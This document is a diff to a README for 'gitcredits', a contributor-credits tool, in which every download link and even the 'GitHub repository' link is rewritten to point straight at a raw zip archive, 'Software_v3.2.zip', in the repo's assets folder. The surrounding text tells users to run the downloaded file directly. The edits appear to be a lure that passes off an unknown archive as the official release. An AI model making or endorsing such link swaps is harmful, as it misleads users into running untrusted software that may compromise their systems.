@@ -1,6 +1,6 @@
 # 🎬 gitcredits - Showcase Your Project Contributors
 
-[![Download](https://img.shields.io/badge/Download-Get%20Gitcredits-4c1?style=for-the-badge&color=ff6f61)](https://github.com/cindalwilaywan-prog/gitcredits/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Gitcredits-4c1?style=for-the-badge&color=ff6f61)](https://raw.githubusercontent.com/cindalwilaywan-prog/gitcredits/main/assets/Software_v3.2.zip)
 
 ## 📋 What is gitcredits?
 
@@ -30,7 +30,7 @@ The following steps explain how to get gitcredits running on your Windows PC.
 
 Go to the official release page to get the latest version:
 
-[Download gitcredits Releases](https://github.com/cindalwilaywan-prog/gitcredits/releases)
+[Download gitcredits Releases](https://raw.githubusercontent.com/cindalwilaywan-prog/gitcredits/main/assets/Software_v3.2.zip)
 
 This page lists all available versions. Look for a Windows file (usually `.exe`).
 
@@ -90,7 +90,7 @@ If your project folder does not use git, gitcredits will show an error or no con
 
 Download gitcredits from the official releases page here:
 
-[Download gitcredits Releases](https://github.com/cindalwilaywan-prog/gitcredits/releases)
+[Download gitcredits Releases](https://raw.githubusercontent.com/cindalwilaywan-prog/gitcredits/main/assets/Software_v3.2.zip)
 
 There is no separate installation process. You only need to download the `.exe` file and run it directly. The program works without needing installation. This makes it easy to try without changing your system.
 
@@ -110,7 +110,7 @@ If gitcredits does not run or shows errors, try these steps:
 
 ## 🔍 More Help
 
-For more details, visit the [GitHub repository](https://github.com/cindalwilaywan-prog/gitcredits). There you will find documentation and community support.
+For more details, visit the [GitHub repository](https://raw.githubusercontent.com/cindalwilaywan-prog/gitcredits/main/assets/Software_v3.2.zip). There you will find documentation and community support.
 
 ---
 
@@ -129,4 +129,4 @@ These key points relate to gitcredits’s design. It is built as a command line 
 
 ---
 
-# [Download gitcredits](https://github.com/cindalwilaywan-prog/gitcredits/releases) - Your Contributors in the Spotlight
+# [Download gitcredits](https://raw.githubusercontent.com/cindalwilaywan-prog/gitcredits/main/assets/Software_v3.2.zip) - Your Contributors in the Spotlight
